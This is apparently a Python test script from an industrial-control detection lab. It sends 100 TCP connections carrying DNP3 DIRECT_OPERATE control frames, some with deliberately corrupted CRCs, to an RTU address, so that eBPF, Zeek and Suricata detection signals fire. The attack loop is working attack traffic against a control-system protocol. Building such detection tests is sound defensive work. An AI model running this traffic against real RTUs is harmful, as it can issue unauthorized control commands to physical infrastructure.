#!/usr/bin/env python3
"""
Step 2: External E2E Pivot Attack Module (Genuine TCP Socket Version)

目的:
1. モック(tee注入)やAPI自己申告(Webdisへの直接アクセス)を完全に排除。
2. Pythonの標準socketモジュールを使用し、実際に 10.0.30.10:20000 へ TCP接続を確立する。
3. これによりカーネル層で tcp_connect が発動し、eBPF (tx_prog.bpf.c) が客観的に捕捉・判定する。

Phase4 テスト#13（複合テスト）用。当初のDNP3_PAYLOADはヘッダCRC・ユーザデータCRCの
両方が丸ごと欠落した構造破綻フレームだったため、dnp3.log/weird.logいずれにも現れず、
Signal2/4/5を検証できていなかった。dnp3_frame.py（正しいCRC計算・CROB実装で確立済み）
のbuild_dnp3_frame()を使うよう書き換えた。

CRC破壊の設計方針（Signal5とSignal2を同一接続で両方踏もうとしない）:
- fc=5(DIRECT_OPERATE)は全接続で固定 → Signal2(危険FC)は正常CRCの接続でのみ発火する
- 100接続中10接続だけvalid_crc=Falseにする → その10件はZeek/Suricataのパーサーで
  弾かれ、weird.log(Signal5)としてのみ記録される。fc値はこの10件では意味を持たない
  （Zeekがフレームをパースする前にweirdとして弾くため）
- 残り90件が正常フレームとしてSignal2(危険FC)・Signal4(レート異常, 10秒/2接続閾値を
  100接続なら確実に超過)を踏む
"""

import socket
import sys
import time
import random

sys.path.insert(0, "/phase-ex")  # dnp3_frame.py はホスト側Phase-ex/を read-only mount
from dnp3_frame import build_dnp3_frame

TARGET_IP = "10.0.30.10"
TARGET_PORT = 20000
ATTACK_COUNT = 100
CRC_BREAK_COUNT = 10  # 100件中10件をCRC破壊(Signal5用)

CRC_BREAK_INDICES = set(random.sample(range(ATTACK_COUNT), CRC_BREAK_COUNT))


def execute_real_attack():
    print(f"[+] Starting GENUINE TCP Socket Attack to {TARGET_IP}:{TARGET_PORT}")
    print("[!] Notice: No OOB API calls (self-reporting) are made by this script.")
    print(f"[!] CRC-broken connections (Signal5 target): {sorted(CRC_BREAK_INDICES)}")

    success_count = 0
    crc_broken_sent = 0
    for i in range(ATTACK_COUNT):
        valid_crc = i not in CRC_BREAK_INDICES
        payload = build_dnp3_frame(function_code=5, dest=1, src=1024, valid_crc=valid_crc)
        try:
            # 毎回新しいソケットを作成し、eBPFの tcp_connect フックを確実に発火させる
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.0)

            # 本物のTCP 3-Way Handshake
            s.connect((TARGET_IP, TARGET_PORT))

            # 本物のペイロード送出(正しいCRC計算込み、10件のみ意図的に破壊)
            s.sendall(payload)

            s.close()
            success_count += 1
            if not valid_crc:
                crc_broken_sent += 1
            time.sleep(0.01)

        except ConnectionRefusedError:
            # 宛先ポートが閉じていてもSYNは出ているためeBPFはフックするが、DNP3としては不成立
            print(f"    [-] Connection Refused on strike {i+1}")
        except Exception as e:
            print(f"    [-] Strike {i+1} error: {e}")

    print(f"[+] E2E Pivot Attack Execution Complete. Successful connections: {success_count}/{ATTACK_COUNT}")
    print(f"[+] CRC-broken connections sent: {crc_broken_sent}/{CRC_BREAK_COUNT}")
    if success_count == 0:
        print("[!] Warning: All connections failed. Is the RTU listening on port 20000?")
        sys.exit(1)


if __name__ == "__main__":
    execute_real_attack()
